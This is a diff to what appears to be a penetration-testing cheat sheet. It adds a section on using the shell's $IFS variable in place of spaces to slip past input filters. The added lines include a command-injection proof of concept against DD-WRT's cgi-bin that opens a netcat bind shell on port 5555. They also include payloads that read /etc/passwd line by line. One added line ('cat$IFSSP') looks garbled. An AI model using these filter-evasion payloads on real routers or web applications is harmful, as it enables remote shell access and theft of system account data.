@@ -45,6 +45,14 @@ shell variable, increment through file one line at a time: <br>
 increment the first +1 to retreive the entire file, line by line<br>
 ``` SP=$'\x20';cat$SP/etc/passwd|tail$SP-n+1|head$SP-n+1 ```
 
+<b>$IFS</b>
+DD-WRT exploit POC circa 2009<br>
+``` http:///cgi-bin/;nc$IFS-l$IFS-p$IFS5555$IFS-e$IFS/bin/sh ```<br>
+or <br>
+``` cat$IFS/etc/passwd ```<br>
+increment the first +1 to retreive the entire file, line by line<br>
+cat$IFSSP/etc/passwd|tail$IFS-n+1|head$IFS-n+1
+
 **Exfiltrating Files / Data**
 
 FTP <br>
